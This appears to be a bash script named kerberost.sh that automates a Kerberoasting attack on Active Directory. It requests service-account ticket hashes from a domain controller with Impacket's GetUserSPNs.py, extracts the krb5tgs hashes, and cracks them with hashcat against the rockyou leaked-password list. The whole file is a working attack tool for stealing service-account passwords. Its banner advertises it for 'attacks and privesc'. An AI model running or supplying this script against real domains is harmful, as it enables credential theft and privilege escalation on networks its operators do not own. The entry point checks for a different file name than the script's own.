#!/bin/bash
###################################################################
#Script Name	: kerberost.sh
#Description	: Tests password strength on service accounts as this can
#               : be abused to do AD privesc
#Args           :
#Author       	: nighter
#Email         	: nighter@nighter.se
###################################################################


# Settings
CACHED_DATA=${CACHED_DATA:-0}
DICTIONARY=${DICTIONARY:-"${HOME}/.kerberost/SecLists/Passwords/Leaked-Databases/rockyou.txt"}

function puts()
{
   # Output messages in fancy colors.
   local _reset=$(tput sgr0)
   if [ "${1}" == "info" ]; then
      printf "%b%b%b\n" "\033[93m" "➜ " "${2}${_reset}"
   elif [ "${1}" == "warning" ]; then
     printf "%b%b%b\n" "\033[93m" "➜ " "${2}${_reset}"
   elif [ "${1}" == "error" ]; then
     printf "%b%b%b\n" "\033[91m" "✖ " "${2}${_reset}"
   elif [ "${1}" == "success" ]; then
     printf "%b%b%b\n" "\033[92m" "✔ " "${2}${_reset}"
   fi
}

function validate_dependencies()
{
    [ ! -d "$HOME/.kerberost" ] && mkdir "$HOME/.kerberost"
    [ ! -e '/usr/bin/GetUserSPNs.py' ] && puts "error" "Impacket is not installed" && exit
    [ ! -e '/usr/bin/hashcat' ] && puts "error" "Hashcat is not installed is required for password cracking" && exit
    [ ! -e '/usr/bin/git' ] && puts "error" "Git is required" && exit
}

function download_dictionaries()
{
    cd $HOME/.kerberost
    if [ ! -d 'SecLists' ]; then
        puts "success" "Download dictionaries"
        git clone https://github.com/mikaelkall/SecLists.git
    fi

    if [ -e "$HOME/.kerberost/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz" ];
    then
        puts "success" "Unpack dictionary"
        ( cd $HOME/.kerberost/SecLists/Passwords/Leaked-Databases/ && tar -xvf rockyou.txt.tar.gz )
    fi
}

function print_usage()
{
cat <<EOT

┬┌─┌─┐┬─┐┌┐ ┌─┐┬─┐┌─┐┌─┐┌┬┐
├┴┐├┤ ├┬┘├┴┐├┤ ├┬┘│ │└─┐ │
┴ ┴└─┘┴└─└─┘└─┘┴└─└─┘└─┘ ┴
Attacks and privesc in Active Directory
 [nighter@nighter.se]

USAGE: ${0} <dc_ip> <domain/username> [dictionary]
EXAMPLE: ${0} 10.100.10.28 domain.com/$USER $HOME/.kerberost/SecLists/Passwords/Leaked-Databases/rockyou.txt
EOT
}

function main()
{
    if [ -z "${2}" ]; then
        print_usage
        exit 1
    fi

    local dc_ip="${1}"
    local domain_user="${2}"
    local dict="${3}"

    if [ ! -z "${dict}" ]; then
        DICTIONARY=${dict}
        [ ! -e "${DICTIONARY}" ] && puts "error" "No such dictionary" && exit
    fi

    validate_dependencies
    download_dictionaries

    cd $HOME/.kerberost

    puts "success" "Fetch SPNs"

    # Get SPNS and hashes
    [ ${CACHED_DATA} == 0 ] && /usr/bin/GetUserSPNs.py -request -dc-ip "${dc_ip}" "${domain_user}" | tee $HOME/.kerberost/SPNs.txt

    if [ ! -e "$HOME/.kerberost/SPNs.txt" ]; then
        puts "error" "Missing SPNs.txt"
        exit 0
    fi

    puts "success" "Extract hashes"

    # Extract hashes.txt
    grep "krb5tgs" "$HOME/.kerberost/SPNs.txt" > $HOME/.kerberost/hashes.txt

    if [ -e "$HOME/.kerberost/hashes.txt" ]; then
        puts "success" "Crack hashes"

        if [ ! -e ${DICTIONARY} ]; then
            puts "error" "Dictionary: ${DICTIONARY} not found"
            exit
        fi

        hashcat -m 13100 $HOME/.kerberost/hashes.txt -w 3 ${DICTIONARY}
    fi
}

####
## Entry point
####
NAME=$(basename "$0")
if [ "$NAME" == "kerberoast.sh" ]; then
      main $@
fi
